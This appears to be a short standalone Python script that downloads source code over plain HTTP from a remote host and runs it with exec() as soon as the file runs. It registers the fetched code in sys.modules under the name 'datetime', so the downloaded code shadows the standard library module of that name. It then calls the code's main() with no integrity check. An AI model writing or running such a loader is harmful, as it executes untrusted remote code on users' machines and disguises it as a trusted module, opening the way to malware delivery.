import sys
import types
import requests

def get_source_and_exec(url, module_name):
    response = requests.get(url)
    source = response.text

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    return module

def execute():
    url = "http://static.example2.org/scripts/utility.py"
    module_name = "datetime"

    module = get_source_and_exec(url, module_name)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
